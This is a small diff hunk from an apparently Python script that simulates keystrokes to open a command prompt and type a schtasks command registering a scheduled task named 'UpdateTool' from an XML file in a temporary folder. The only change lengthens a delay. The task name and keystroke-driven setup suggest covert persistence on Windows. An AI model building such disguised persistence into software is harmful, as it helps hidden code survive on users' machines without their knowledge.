@@ -119,7 +119,7 @@ keyboard.type('cmd')
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
 
-time.sleep(0.5)
+time.sleep(1)
 
 keyboard.type(r'schtasks /create /tn "UpdateTool" /xml "' + newpath_tmp + '\\' + xmlname)
 keyboard.press(Key.enter)
